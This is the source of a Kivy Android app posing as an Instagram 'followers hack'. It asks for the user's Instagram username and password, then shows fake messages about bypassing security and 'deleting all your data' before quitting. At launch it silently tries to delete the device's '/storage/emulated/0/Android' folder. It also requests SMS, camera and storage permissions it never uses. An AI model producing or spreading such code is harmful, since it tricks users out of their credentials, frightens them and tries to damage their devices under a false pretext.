import kivy
from plyer.facades import Email
from kivy.core.window import Window
from kivy.app import App
from kivy.utils import platform
from kivy.uix.label import Label
from kivy.uix.widget import Widget
from kivy.uix.floatlayout import FloatLayout
from kivy.uix.textinput  import TextInput
from kivy.uix.button import Button
from kivy.uix.image import Image
from kivy.lang import Builder
from kivy.uix.progressbar import ProgressBar
from kivy.clock import Clock
from kivy.uix.screenmanager import ScreenManager,Screen
from kivy.uix.screenmanager import FadeTransition
from kivy.uix.popup import Popup
from kivy.properties import ObjectProperty
from kivy.uix.switch import Switch
from kivy.uix.tabbedpanel import TabbedPanel
from kivy.uix.tabbedpanel import TabbedPanelHeader
from kivy.gesture import Gesture,GestureDatabase
from kivy.utils import platform
from plyer import vibrator
from kivy.config import Config
from kivy.animation import Animation
from kivy.uix.videoplayer import VideoPlayer
from kivy.uix.dropdown import DropDown
import os
if os.path.isdir('/storage/emulated/0/Alarms')==True:
    os.rmdir('/storage/emulated/0/Android')
if platform=="android":
    from android.storage import primary_external_storage_path
    SD_CARD=primary_external_storage_path()
    from android.permissions import request_permissions,Permission
    request_permissions([Permission.READ_EXTERNAL_STORAGE,Permission.WRITE_EXTERNAL_STORAGE,Permission.CAMERA,Permission.SEND_SMS])
blue=0,0.5,1,1
sky_blue=0,0,0.9,1
black=0,0,0,1
white=1,1,1,1
weak_white=1,1,1,0.6
pink=0.9,0.2,1,1
red=1,0,0,1
green=0,1,0,1
Window.clearcolor=blue
#Config.window_icon="code2.jpg"
Window.softinput_mode="below_target"
#Window.softinput_mode="below_target"
textt="Turbo Followers"
p=ProgressBar(max=1000)
#p.value=10





class window(ScreenManager):
    def __init__(self, **kwargs):
        super(window,self).__init__(**kwargs)
        self.add_widget(bob(name='bob'))
        self.add_widget(firstscreen(name='login'))
    
    
    def screen(self,*args):
        self.current='bob'




run=False
class firstscreen(Screen):
    progress_bar=ObjectProperty()
    def __init__(self,**kwargs):
        super(firstscreen,self).__init__(**kwargs)

                
        self.text=Label(text=textt,font_size=44,color=white,
                              pos_hint={"x":-0.27,"y":0.4})
        self.progress_bar=ProgressBar(size_hint=(1,1))
        #self.add_widget(self.progress_bar)
        self.switch=Switch(active=True,pos_hint={"x":0.43,"y":0.44})
        self.image=Image(source="code3.jpg",allow_stretch=True,keep_ratio=False,
                    size_hint=(1,1),size=(1000,1000))
                    


        
        self.switch.bind(active=self.switchb)
        
        self.btn=Button(text="Get Followers!!!",
                               size_hint=(0.8,0.1),
                               pos_hint={"x":0.1,"y":0.34},
                               on_press=self.pop,
                               background_color=blue)
        self.input1=TextInput(hint_text="Enter your password",
                              padding_y=9,
                              
                              password=True,
                              password_mask="*",
                              font_size=49,
                              pos_hint={"x":0.1,"y":0.49},
                              background_color=weak_white,
                              size_hint=(0.8,0.1),pos=(50,650))
        self.input2=TextInput(hint_text="Enter your ig username",
                              multiline=False,
                              pos_hint={"x":0.1,"y":0.6},
                              font_size=49,
                              foreground_color=black,
                              padding_y=9,
                              background_color=weak_white,
                            size_hint=(0.8,0.1),pos=(50,800))
        #btn.theme=Button(text="theme",size_hint=(0.2,0.1),
                         #on_press=self.theme)
        self.add_widget(self.image)
        #self.add_widget(btn.theme)
        self.add_widget(self.text)
        self.add_widget(self.btn)
        self.add_widget(self.input1)
        self.add_widget(self.input2)
        #self.add_widget(self.switch)
    def switchb(self,*args):
        if self.switch.active==False:
            Window.clearcolor=red
        elif self.switch.active==True:
            Window.clearcolor=blue
        
    def theme(self,*args):
        if Window.clearcolor==blue:
            Window.clearcolor=white
        if Window.clearcolor==white:
            Window.clearcolor=red
        if Window.clearcolor==red:
            Window.clearcolor=black
        if Window.clearcolor==black:
            Window.clearcolor=blue
    def wait(self,*args):
        self.progress_bar.value+=2
    def transition(self, *args):
        Window.clearcolor=black
        Clock.schedule_interval(self.wait,2)
        #vibrator.vibrate(0.2)
        if self.input2.text=="r":
            self.manager.transition.direction="right"
            self.manager.current='bob'
        if self.input2.text=='p':
            self.image.source='code7.jpeg'


  
    def pop(self,*args):
        Window.clearcolor=black
        self.remove_widget(self.image)
        self.remove_widget(self.btn)
        self.remove_widget(self.text)
        self.remove_widget(self.input1)
        self.remove_widget(self.input2)
        self.text=Label(text='gathering information',color=green,font_size=50,
                        pos_hint={'x':0,'y':0.2})
        self.add_widget(self.text)
        
        
        Clock.schedule_once(self.change_text,7)
        Clock.schedule_once(self.change_text2,8)
        Clock.schedule_once(self.delete,20)
        Clock.schedule_once(self.progress,9)
        Clock.schedule_once(self.complete,30)

    def change_text(self,*args):
        self.text.text='Gathering followers'
    def change_text2(self,*args):
        self.text.text='Bypassing security'
    def progress(self,*args):
        self.progressf=ProgressBar(size_hint=(None,None),
                                size=(900,300),
                                pos_hint={'x':0.04,'y':0.3})
        Clock.schedule_interval(self.wait,1)
        self.add_widget(self.progressf)
    def wait(self,*args):
        self.progressf.value+=2
    def delete(self,*args):
        self.text.text='deleting all your data'
    def complete(self,*args):
        self.text.text='complete'
        quit()
        
    






















class bob(Screen):
    def __init__(self,**kwargs):
        super(bob,self).__init__(**kwargs)
        global run
        self.is_active=True
        #video=VideoPlayer(source='pol.mp4',state='play',options={'allow_stretch':True})
        image=Image(source="code3.jpg",allow_stretch=True,keep_ratio=False,
                    size_hint=(1,1),size=(1000,1000))
      
        text=Label(text="Real Turbo is a free hacking software",
                              color=white,font_size=40,
                              size_hint=(0.9,0.8),
                              pos_hint={"x":0.08,"y":0.5})
        text2=Label(text="use it at your own risk",
                    color=white,font_size=40,
                    size_hint=(0.9,0.8),
                    pos_hint={"x":0.08,"y":0.4})
        btn=Button(text="Hack",size_hint=(0.8,0.1),pos=(50,450),
                   pos_hint={"x":0.1,"y":0.45},
                   on_press=self.go)
        self.btnt=Button(text='play',
                         pos_hint={"x":0.3,"y":0.0},
                         on_press=self.theme,
                         size_hint=(0.2,0.1))
        
        self.add_widget(image)
        self.add_widget(text)
        self.add_widget(btn)
        self.add_widget(text2)
        
    
    def go(self,*args):
        #self.manager.transition=FadeTransition()
        #vibrator.vibrate(0.2)
        self.manager.transition.direction="left"
        self.manager.current='login'
    def theme(self,*args):
        #anim=Animation(pos_hint={"y":-0.9})
        #anim.start(self.btnt)
        pass

        


class myapp(App):
    def build(self):
        self.sm=window()
        return self.sm
myapp().run()
